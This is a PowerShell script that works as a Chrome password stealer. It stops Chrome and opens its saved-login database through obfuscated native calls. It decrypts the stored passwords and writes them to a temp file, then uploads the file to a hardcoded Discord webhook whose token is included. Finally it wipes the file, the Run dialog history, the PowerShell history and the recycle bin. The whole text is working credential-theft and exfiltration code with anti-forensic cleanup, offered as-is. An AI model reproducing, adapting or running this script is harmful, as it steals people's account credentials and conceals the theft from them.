#########################################################################################################
# Updated to support Discord webhook exfiltration only
#########################################################################################################

# Discord Webhook URL
$DiscordWebhook = "https://discord.com/api/webhooks/1305915579269386260/XFWxT4Q5T71Pht4mBOg9bd6y_R5fcBNmD3E7TuoesCLM7SmAC2O7yXvnKXRAYSKJOK9P"

$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"

# Stage 1: Obtain the credentials from Chrome
Stop-Process -Name Chrome -ErrorAction SilentlyContinue

$d=Add-Type -A System.Security
$p='public static'
$g=""")]$p extern"
$i='[DllImport("winsqlite3",EntryPoint="sqlite3_'
$m="[MarshalAs(UnmanagedType.LP"
$q='(s,i)'
$f='(p s,int i)'
$z=$env:LOCALAPPDATA+'\Google\Chrome\User Data'
$u=[Security.Cryptography.ProtectedData]
Add-Type "using System.Runtime.InteropServices;using p=System.IntPtr;$p class W{$($i)open$g p O($($m)Str)]string f,out p d);$($i)prepare16_v2$g p P(p d,$($m)WStr)]string l,int n,out p s,p t);$($i)step$g p S(p s);$($i)column_text16$g p C$f;$($i)column_bytes$g int Y$f;$($i)column_blob$g p L$f;$p string T$f{return Marshal.PtrToStringUni(C$q);}$p byte[] B$f{var r=new byte[Y$q];Marshal.Copy(L$q,r,0,Y$q);return r;}}"
$s=[W]::O("$z\\Default\\Login Data",[ref]$d)
$l=@()
if($host.Version-like"7*"){$b=(gc "$z\\Local State"|ConvertFrom-Json).os_crypt.encrypted_key
$x=[Security.Cryptography.AesGcm]::New($u::Unprotect([Convert]::FromBase64String($b)[5..($b.length-1)],$n,0))}$_=[W]::P($d,"SELECT*FROM logins WHERE blacklisted_by_user=0",-1,[ref]$s,0)
for(;!([W]::S($s)%100)){$l+=[W]::T($s,0),[W]::T($s,3)
$c=[W]::B($s,5)
try{$e=$u::Unprotect($c,$n,0)}catch{if($x){$k=$c.length
$e=[byte[]]::new($k-31)
$x.Decrypt($c[3..14],$c[15..($k-17)],$c[($k-16)..($k-1)],$e)}}$l+=($e|%{[char]$_})-join''}

# Save credentials to file
$l -join "`n" | Out-File -Encoding utf8 "$env:TEMP\$FileName"

# Restart Chrome
$pathToChrome = 'C:\Program Files (x86)\Google\Chrome\Application\chrome.exe'
Start-Process -FilePath $pathToChrome

# Stage 2: Exfiltration to Discord webhook
$FilePath = "$env:TEMP\$FileName"
$FileContent = [System.IO.File]::ReadAllBytes($FilePath)
$EncodedContent = [Convert]::ToBase64String($FileContent)

$Body = @{ content = "Chrome Credentials for $env:USERNAME"; file = $EncodedContent }
Invoke-RestMethod -Uri $DiscordWebhook -Method Post -Form $Body

# Stage 3: Cleanup
rm "$env:TEMP\$FileName" -Force -ErrorAction SilentlyContinue
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
exit
